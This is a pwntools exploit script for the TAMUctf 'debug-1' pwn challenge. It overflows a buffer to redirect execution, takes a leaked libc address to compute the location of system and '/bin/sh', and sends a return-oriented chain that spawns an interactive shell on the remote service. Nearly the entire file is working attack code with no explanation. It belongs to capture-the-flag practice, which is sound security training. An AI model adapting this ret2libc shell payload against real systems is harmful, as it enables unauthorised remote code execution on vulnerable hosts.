from pwn import * 

binary = './debug-1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')


p = process(binary)
p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")
s = '''
b * modify+260
b * debug+268
'''

p.sendline("1")

debug = 0x000000000040139f

print_sys = 0x000000000040142c




# gadgets
ret = 0x0000000000401016
pop_rdi = 0x000000000040154b



payload = flat(
	b'A' * 69,
	b'B' * 11,
	p64(0x404000+4),
	p64(debug+1)


)
p.send(payload)

p.sendline("1")
p.recvuntil("libc leak: ")
leak = p.recvline().strip().decode()

print(leak)


leak = int(leak, 16)
print(hex(leak))

system_addr = leak
libc_base = leak - libc.sym['system']
bin_sh_addr = libc_base + 0x18052c

#gdb.attach(p, s)
payload2 = flat(
	b'B' * 0x60,
	b'B' * 8,
	p64(pop_rdi),
	p64(bin_sh_addr),
	p64(system_addr)
)
p.sendline(payload2)

p.interactive()
